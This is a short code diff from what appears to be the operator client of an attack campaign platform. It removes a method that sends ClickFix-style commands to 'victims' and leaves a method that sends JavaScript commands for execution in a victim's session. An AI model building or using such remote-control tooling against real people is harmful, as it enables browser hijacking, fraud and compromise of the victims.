@@ -125,13 +125,6 @@ export function createVictimsClient(apiClient) {
       return data.events || []
     },
 
-    async sendClickFix(campaignId, victimId, command) {
-      return await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/clickfix`, {
-        method: 'POST',
-        body: JSON.stringify({ command })
-      })
-    },
-
     async sendJSCommand(campaignId, victimId, command) {
       return await apiClient.request(`${CAMPAIGN_API}/${campaignId}/victims/${victimId}/exec`, {
         method: 'POST',
